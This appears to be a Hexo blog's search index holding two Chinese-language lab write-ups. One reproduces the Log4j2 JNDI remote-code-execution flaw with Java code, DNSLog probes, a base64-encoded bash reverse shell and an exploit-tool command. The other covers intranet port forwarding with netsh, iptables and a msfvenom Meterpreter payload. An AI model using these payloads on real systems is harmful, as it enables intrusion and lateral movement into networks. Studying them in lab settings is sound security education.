<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Log4J2-RCE漏洞</title>
    <url>/2023/08/16/Log4J2-RCE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h1><p>Apache Log4j2是一个基于java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。</p>
<p>2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。</p>
<p><strong>漏洞适用版本：</strong>2.0 &lt;&#x3D; Apache log4j2 &lt;&#x3D;2.14.1</p>
<h1 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h1><h2 id="1、原理概述"><a href="#1、原理概述" class="headerlink" title="1、原理概述"></a>1、原理概述</h2><p>Apache log4j2-RCE漏洞是由于Log4j2提供的lookup功能下的jndi Lookup模块出现问题所导致的，该功能模块在输出日志信息时允许开发人员通过相应的协议去<strong>请求远程主机上的资源</strong>。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源并执行其中的代码，从而造成远程代码执行漏洞。</p>
<h2 id="2、JNDI"><a href="#2、JNDI" class="headerlink" title="2、JNDI"></a>2、JNDI</h2><p>开发人员一般会使用log4j2在日志中输出一些变量，Iog4j2除了可以输出程序中的变量，它还提供了多种lookup功能插件，可以用来查找更多数据用于输出。lookupi在log4j2中，就是允许在输出日志的时候，通过多种方式去查找要输出的内容，其中就可以使用ndi Lookup。</p>
<p>JNDI (Java Naming and Directory Interface，JAVA命名和目录接口)：它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。JND下面有很多目录接口，用于不同的数据源的查找引用。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/0c5aff5fc511dbb9d5697c91e9add598.png"
                      alt="0c5aff5fc511dbb9d5697c91e9add598.png"
                ></p>
<p>JNDI可以使用相应目录接口请求普通数据，还可以请求Java（编译型语言）对象。而且JNDl支持以命名引用(Naming References)的方式去远程下载一个class（Java编译后的文件 .class）文件，然后加载该class文件并构建对象。若下载的是攻击者构建的含有恶意代码的class文件，则会在加载时执行恶意代码。</p>
<p>在这些目录接口中我们可以使用LDAP或RMI去下载远程主机上的class文件。</p>
<p>LDAP(轻型目录访问协议)：是一个开放的，中立的，工业标准的应用协议，通过P协议提供访问控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux&#x2F;Unix系统中的文件目录一样。</p>
<p>RMl(远程方法调用)：它是一种机制，能够让在某个java虚拟机上的对象调用另一个ava虚拟机的对象的方法。</p>
<h2 id="3、触发过程"><a href="#3、触发过程" class="headerlink" title="3、触发过程"></a>3、触发过程</h2><p>Iog4j2 远程代码执行漏洞大致过程（此处使用RMl，LDAP同理）：</p>
<p>假设有一个Java程序，将用户名信息记录到了日志中，如下</p>
<p>1.攻击者发送一个HTTP请求，其用户名为<code>$&#123;jndi:rmi://rmi服务器地址/Exploit)&#125;</code></p>
<p>2.被攻击服务器发现要输出的信息中有<code>$&#123;&#125;</code>，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMl，而后根据RMI服务器地址去请求Exploit。</p>
<p>3.RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类），而该Reference指定了远端文件下载服务器上含有恶意代码的class文件。</p>
<p>4.被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。</p>
<p>5.被攻击服务器下载恶意class文件并执行其中的恶意代码。</p>
<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><h2 id="1、实验环境"><a href="#1、实验环境" class="headerlink" title="1、实验环境"></a>1、实验环境</h2><p>本次实验在Windows环境下使用IDEA编写相应java程序来进行Apache log4j2远程代码执行漏洞的模拟。</p>
<ul>
<li>jdk1.8.0181</li>
<li>Apache log4j2   2.14.1</li>
</ul>
<h2 id="2、实验过程"><a href="#2、实验过程" class="headerlink" title="2、实验过程"></a>2、实验过程</h2><p>创建一个Maven项目，在pom.xm文件中引入Iog4j依赖，指定版本为2.14.1。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.1og4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>l0g4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.1og4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>模拟黑客服务器：</p>
<p>1.创建EvilObj类，执行Windows命令打开计算器。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evilobj</span> &#123;</span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;执行恶意代码！&quot;</span>)；</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">//执行命令打开计算器</span></span><br><span class="line">			Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>2.创建RMIServer类，用于开启RMI服务。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"><span class="keyword">import</span> ...;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//启动rmi服务，端口为1099</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry();</span><br><span class="line">            <span class="comment">//创建资源，指定资源为本机rmi目录下的EvilObj类</span></span><br><span class="line">            <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;rmi.Evilobj&quot;</span>,<span class="string">&quot;rmi.Evilobj&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            <span class="type">Referencewrapper</span> <span class="variable">referencewrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Referencewrapper</span> (reference);</span><br><span class="line">            <span class="comment">//绑定资源，用于客户机访问对应资源</span></span><br><span class="line">            registry.bind(<span class="string">&quot;evil&quot;</span>,referenceWrapper);</span><br><span class="line">            System.out.println(<span class="string">&quot;RMI服务初始化完成&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printstackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>模拟受害主机：</p>
<p>1.创建HackedServer类，模拟攻击者发送信息，受害服务器将对应信息作为error级别日志输出。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.woniu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.Logging.Log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hackedserver</span> &#123;</span><br><span class="line">    <span class="comment">//创建日志记录器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(); <span class="comment">//实例化对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(string...args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;被攻击服务器&quot;</span>);</span><br><span class="line">        <span class="comment">//模拟攻击者发送请求中的username字段，指向攻击者服务器上的恶意class</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span><span class="string">&quot;$jndi:rmi://192.168.200.95/evil&#125;;</span></span><br><span class="line"><span class="string">        //输出错误日志信息</span></span><br><span class="line"><span class="string">        logger.error(&quot;</span>errorinfo：&#123;&#125;!<span class="string">&quot;username);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>攻击过程模拟：</p>
<p>1.运行RMIServer，启动RMI服务。</p>
<p>2.启动受害主机</p>
<h1 id="四、靶场模拟"><a href="#四、靶场模拟" class="headerlink" title="四、靶场模拟"></a>四、靶场模拟</h1><h2 id="1、实验环境-1"><a href="#1、实验环境-1" class="headerlink" title="1、实验环境"></a>1、实验环境</h2><p><strong>被攻击服务器</strong></p>
<p>主机：CentoS7</p>
<p>靶场环境：vulfocus&#x2F;log4j2-rce-2021-12-09</p>
<p><strong>攻击者</strong></p>
<p>主机：kali</p>
<p>JNDI注入工具：JNDl-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
<p><a class="link"   href="https://github.com/welk1n/JNDl-Injection-Exploit/releases/tag/v1.0" >https://github.com/welk1n/JNDl-Injection-Exploit/releases/tag/v1.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="2、实验过程-1"><a href="#2、实验过程-1" class="headerlink" title="2、实验过程"></a>2、实验过程</h2><h3 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h3><p>(1)安装docker所需工具：<code>yum install-y yum-utils device-mapper-persistent-data lvm2</code></p>
<p>(2)添加yum镜像：<code>yum-config-manager --add-repo</code> <a class="link"   href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo" >http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>(3)更新yum缓存：<code>yum makecache fast</code></p>
<p>(4)下载安装docker：<code>yum install docker-ce</code></p>
<p>(5)启动docker：<code>systemctl start docker</code></p>
<p>(6)配置Docker的国内镜像：<code>vi /etc/docker/daemon.json</code></p>
<h3 id="2-使用dockeri部署log4j2漏洞靶场"><a href="#2-使用dockeri部署log4j2漏洞靶场" class="headerlink" title="2.使用dockeri部署log4j2漏洞靶场"></a>2.使用dockeri部署log4j2漏洞靶场</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br><span class="line">docker ps</span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">PS C:\Users\ppp&gt; docker ps -a</span><br><span class="line">=============================</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED          STATUS                      PORTS     NAMES</span><br><span class="line">b39cdddd1dd3   hello-world   &quot;/hello&quot;   13 seconds ago   Exited (0) 12 seconds ago             charming_chandrasekhar</span><br></pre></td></tr></table></figure></div>

<h4 id="（1）拉取log4j2漏洞的靶场镜像"><a href="#（1）拉取log4j2漏洞的靶场镜像" class="headerlink" title="（1）拉取log4j2漏洞的靶场镜像"></a>（1）拉取log4j2漏洞的靶场镜像</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入本地镜像</span></span><br><span class="line">docker load -i log4j2-rce-2021-12-09.tar.gz  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入拉取成功</span></span><br><span class="line">PS C:\Users\ppp&gt; docker images</span><br><span class="line">------------------------------</span><br><span class="line">REPOSITORY                       TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">vulfocus/log4j2-rce-2021-12-09   latest    4ba6de62bfd4   19 months ago   569MB</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><a class="link"   href="https://vulhub.org/" >Vulhub - Docker-Compose file for vulnerability environment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<h4 id="（2）创建容器并运行"><a href="#（2）创建容器并运行" class="headerlink" title="（2）创建容器并运行"></a>（2）创建容器并运行</h4><p><code>docker run -tid -p 8080:8080 vulfocus/log4j2-rce-2021-12-09</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行镜像</span></span><br><span class="line">docker run -itd --name log4j2 -p 8080:8080 4ba6de62bfd4（IMAGE ID）</span><br><span class="line"></span><br><span class="line">================</span><br><span class="line">PS C:\Users\ppp&gt; docker run -itd --name log4j2 -p 8080:8080 4ba6de62bfd4</span><br><span class="line">----------------</span><br><span class="line">07155d44bbb88c17c04facd09faed6fcb7ae2d1094db4f51390d7e0c29d66c08</span><br><span class="line"></span><br><span class="line">================</span><br><span class="line">PS C:\Users\ppp&gt; docker ps  # cheng</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                   CREATED          STATUS          PORTS                    NAMES</span><br><span class="line">07155d44bbb8   4ba6de62bfd4   &quot;java -jar /demo/dem…&quot;   56 seconds ago   Up 55 seconds   0.0.0.0:8080-&gt;8080/tcp   log4j2</span><br></pre></td></tr></table></figure></div>

<h4 id="（3）开启8080端口，访问web服务"><a href="#（3）开启8080端口，访问web服务" class="headerlink" title="（3）开启8080端口，访问web服务"></a>（3）开启8080端口，访问web服务</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/117350f11a80fb9df3992f43bb78971f.png"
                      alt="117350f11a80fb9df3992f43bb78971f.png"
                ></p>
<h3 id="3-使用DNSLog进行测试"><a href="#3-使用DNSLog进行测试" class="headerlink" title="3.使用DNSLog进行测试"></a>3.使用DNSLog进行测试</h3><p>(1)前往<a class="link"   href="http://www.dnslog.cn,申请子域名进行测试/" >http://www.dnslog.cn,申请子域名进行测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/a096ba03a94522ae0444a2d38d5d5051.png"
                      alt="a096ba03a94522ae0444a2d38d5d5051.png"
                ></p>
<p>(2)在web主页面中点击 ???，url地址变为<a class="link"   href="http://localhost:8080/hello?payloada=111,%E6%9B%B4%E6%94%B9payload%E4%B8%BA$%7Bjndi:ldap:/test.f2l309.dnslog.cn%7D%EF%BC%8C%E5%B9%B6%E5%B0%86payloadi%E8%BF%9B%E8%A1%8Curl%E7%BC%96%E7%A0%81%E3%80%82" >http://localhost:8080/hello?payloada=111,更改payload为${jndi:ldap:/test.f2l309.dnslog.cn}，并将payloadi进行url编码。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/hello?payload=$&#123;jndi:ldap://test.cohgfw.dnslog.cn&#125;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8080/hello?payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%74%65%73%74%2e%63%6f%68%67%66%77%2e%64%6e%73%6c%6f%67%2e%63%6e%7d</span><br></pre></td></tr></table></figure></div>

<p>访问成功后，查看DNSLog的DNS查询记录，出现payload中的字段说明测试成功。</p>
<h3 id="4-利用JNDI注入反弹shell"><a href="#4-利用JNDI注入反弹shell" class="headerlink" title="4.利用JNDI注入反弹shell"></a>4.利用JNDI注入反弹shell</h3><p>(1)准备反弹shell，并将此命令进行base64编码</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击主机IP/端口 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.5/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>

<p>(2)使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行漏洞利用，将上述base64编码结果填入指定位置，指定kali的IP启动服务。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,base64码后的she11&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNS80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP(kali)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透原理</title>
    <url>/2023/08/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h1 id="一、内网穿透原理"><a href="#一、内网穿透原理" class="headerlink" title="一、内网穿透原理"></a>一、内网穿透原理</h1><h2 id="1、内网穿透"><a href="#1、内网穿透" class="headerlink" title="1、内网穿透"></a>1、内网穿透</h2><p>利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。<br>（1）端口转发：将发往外网某个端口的数据完全转发给内网，是外网到内网的单向通信。</p>
<p>（2）端口映射：将内网IP的某个端口映射到公网IP的某个端口，实现通过公网IP+端口直接正向访问内网，端口映射实现双向通信。</p>
<h2 id="2、隧道技术"><a href="#2、隧道技术" class="headerlink" title="2、隧道技术"></a>2、隧道技术</h2><p>是一种通过使用互联网络的基础设施在网络之间传递数据的方式。红队在进攻的时候，需要在复杂的内容中获取稳定的流量交互，以达到目的。攻击者通常会采用各种内网穿透技术建立隧道，从不同网络协议层对出口屏蔽或拦截进行绕过。进行内网渗透常用的隧道技术有dns隧道、htp隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。</p>
<p>（1）网络层隧道：IPV6隧道、ICMP隧道、GRE隧道，其中常用的隧道技术是ICMP隧道技术。</p>
<p>（2）传输层隧道：主要有TCP、UDP协议，因此隧道搭建也是基于这两种协议进行的。常用的隧道搭建工具有netcat、powercat等。</p>
<p>（3）应用层隧道：应用层位于TCP&#x2F;IP协议的最顶层，通常用于搭建各种应用服务，而基于应用层搭建的隧道技术就是利用各种应用所占用的端口进行塔建，比如有SSH、HTTP&#x2F;HTTPS和DNS服务，这些服务是服务器经常用到不会被禁止的协议。</p>
<h2 id="3、各类工具"><a href="#3、各类工具" class="headerlink" title="3、各类工具"></a>3、各类工具</h2><p>如Windows自带的netsh命令、MSF、CS、Neo-reGeorg、proxychains、profiler、PowerCat、netcat、Tunna、frp、EarthWorm等。</p>
<h1 id="二、构建实验环境"><a href="#二、构建实验环境" class="headerlink" title="二、构建实验环境"></a>二、构建实验环境</h1><h2 id="1、网络构成"><a href="#1、网络构成" class="headerlink" title="1、网络构成"></a>1、网络构成</h2><p>(1)攻击主机：Kai,IP地址：192.168.112.148<br>(2)代理主机：Windows2016,IP地址：192.168.112.160,10.10.10.128<br>(3)内网主机：Windows7,IP地址：10.10.10.129</p>
<p>Kali可以与Windows2016通信，不能与Windows7通信，Windows2016可以与Windows7通信。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/b91e23bec64ad1d45a15d13a9b5c5cc6.png"
                      alt="b91e23bec64ad1d45a15d13a9b5c5cc6.png"
                ></p>
<p>2、修改VMWare网络设置<br>将VMnet1仅主机模式的lP地址修改为：10.10.10.0，本机默认为192.168.119.0，为了显著区分HostOnly与NAT的IP地址差异而进行的修改，当然，也可以不修改，保持192.168.119.0网段。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/8856189c3fabca1c47002dc267813d9c.png"
                      alt="8856189c3fabca1c47002dc267813d9c.png"  
                ></p>
<p>在安装有Python的环境中，如果需要临时启动一个HTTP服务器用于测试，可以直接运行命令：<code>python-m http.server</code></p>
<h2 id="2、配置补充知识"><a href="#2、配置补充知识" class="headerlink" title="2、配置补充知识"></a>2、配置补充知识</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/403513377" >搞懂虚拟机VirtualBox网络配置 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li>桥接：直接等同于又开了一台独立主机，向网关请求IP（于主机同一网段）</li>
<li>NAT：与主机公用一个IP（请求网关），独立一套IP网段用于虚拟机间连接。（对于网关来说，就一个IP地址请求它）</li>
<li>host-noly：独立一套IP网段用于虚拟机间连接，只有主机能够通过虚拟网卡连接。里面不能访问外边（也可以配置，但麻烦<a class="link"   href="https://www.linuxidc.com/Linux/2016-09/135521p3.htm" >Host-Only（仅主机模式） - VMware虚拟机三种网络模式详解_Linux教程_Linux公社-Linux系统门户网站 (linuxidc.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）</li>
</ul>
<h1 id="三、内网穿透-端口转发"><a href="#三、内网穿透-端口转发" class="headerlink" title="三、内网穿透-端口转发"></a>三、内网穿透-端口转发</h1><h2 id="使用netsh进行端口转发"><a href="#使用netsh进行端口转发" class="headerlink" title="使用netsh进行端口转发"></a>使用netsh进行端口转发</h2><h3 id="1、配置端口转发"><a href="#1、配置端口转发" class="headerlink" title="1、配置端口转发"></a>1、配置端口转发</h3><p>(1)先在Windows7上启动一个Xampp的服务(80端口)，或者其他服务。<br>(2)在Windows2016服务器上，运行以下命令，完成端口转发。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=8888 connectaddress=10.10.10.129 connectport=80</span><br></pre></td></tr></table></figure></div>

<h3 id="2、测试端口转发"><a href="#2、测试端口转发" class="headerlink" title="2、测试端口转发"></a>2、测试端口转发</h3><p>(1)在Kali上访问http:&#x2F;192.1682.160:8888&#x2F;dashboard&#x2F;phpinfo.php,PHPINFO显示这是一台Windows7的主机，端口转发成功。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/885f1ec634d86eecaf1adf43e1c09cea.png"
                      alt="885f1ec634d86eecaf1adf43e1c09cea.png"
                ></p>
<p>(2)在Windows2016上，运行以下命令可以查看端口转发列表。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy show all</span><br></pre></td></tr></table></figure></div>

<p>(3)此时，在Windows2016的服务器上，直接可以使用localhost进行访问。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/797401510488e421eb73e7989a23fe6f.png"
                      alt="797401510488e421eb73e7989a23fe6f.png"
                ></p>
<h3 id="3、清除转发规则"><a href="#3、清除转发规则" class="headerlink" title="3、清除转发规则"></a>3、清除转发规则</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">netsh interface portproxy delete v4tov4 listenport=8888</span><br><span class="line">netsh interface portproxy reset</span><br></pre></td></tr></table></figure></div>

<p>如果Windows2016的防火墙限制了8888的端口访问，则此时端口转发将无法生效，所以，还需要寻找更多解决方案。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/a0fa9c768540bdb30d00a41590e9ff10.png"
                      alt="利用管理员权限开启端口"
                ></p>
<h3 id="4、Linux上的端口转发"><a href="#4、Linux上的端口转发" class="headerlink" title="4、Linux上的端口转发"></a>4、Linux上的端口转发</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -d 192.168.112.153 -p tcp --dport 8088 -j SNAT --to 192.168.112.188</span><br><span class="line">firewall-cmd --add-forward-port=port=8888:proto=tcp:toaddr=101.37.65.91:toport=80</span><br></pre></td></tr></table></figure></div>

<h2 id="使用Meterpreter进行端口转发"><a href="#使用Meterpreter进行端口转发" class="headerlink" title="使用Meterpreter进行端口转发"></a>使用Meterpreter进行端口转发</h2><h3 id="1、为代理主机生成木马"><a href="#1、为代理主机生成木马" class="headerlink" title="1、为代理主机生成木马"></a>1、为代理主机生成木马</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.112.148 LPORT=4444 -f exe -o shell.exe</span><br></pre></td></tr></table></figure></div>

<p>将上述木马运行于Windows2016服务器上，获取到Meterprter反弹连接。</p>
<h3 id="2、为代理主机配置端口转发"><a href="#2、为代理主机配置端口转发" class="headerlink" title="2、为代理主机配置端口转发"></a>2、为代理主机配置端口转发</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.112.148</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在Windows2016上启动木马，获取Meterpreter,然后配置端口转发参数给Windows2016</span></span><br><span class="line">meterpreter portfwd add -l 8889 -r 10.10.10.129 -p 80</span><br><span class="line">[*]Loca1 TCP relay created::8889 &lt;-&gt; 10.10.10.129:80</span><br></pre></td></tr></table></figure></div>

<h3 id="3、在Kali上直接访问localhost-8889"><a href="#3、在Kali上直接访问localhost-8889" class="headerlink" title="3、在Kali上直接访问localhost:8889"></a>3、在Kali上直接访问localhost:8889</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/859222b8f9253427a70e093478eda6ca.png"
                      alt="859222b8f9253427a70e093478eda6ca.png"
                ></p>
<h3 id="4、在Kali上访问Windows7的远程桌面"><a href="#4、在Kali上访问Windows7的远程桌面" class="headerlink" title="4、在Kali上访问Windows7的远程桌面"></a>4、在Kali上访问Windows7的远程桌面</h3><p>(1)先确保Windows7的远程桌面服务已经启动。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/a7da71445febad4458a2ae4d927a119a.png"
                      alt="a7da71445febad4458a2ae4d927a119a.png"
                ></p>
<p>(2)在Meterpreter中执行命令：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 8839 -r 10.10.10.129 -p 3389</span><br></pre></td></tr></table></figure></div>

<p>(3)在Kali（不是meterpreter）中运行命令：<code>rdesktop 127.0.0.1:8839</code> 完成远程桌面访问。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://blog.pppfz.com/assets/a5454b4451b41b1fc5175d9f07ed4dff.png"
                      alt="a5454b4451b41b1fc5175d9f07ed4dff.png"
                ></p>
<p>(4)以类似的方式，也可以直接将Windows2016的3389端口转发到Kli本地，实现对代理主机的远程访问。</p>
